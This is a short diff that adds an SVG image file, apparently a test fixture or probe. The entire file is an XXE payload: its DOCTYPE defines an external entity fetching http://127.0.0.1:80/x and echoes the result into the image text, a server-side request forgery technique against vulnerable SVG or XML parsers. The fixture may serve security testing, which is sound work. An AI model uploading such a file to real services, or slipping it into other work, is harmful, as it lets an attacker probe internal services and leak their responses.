@@ -1,0 +1,2 @@
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/x">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="60"><text x="5" y="30" font-size="14">L:&xxe;</text></svg>
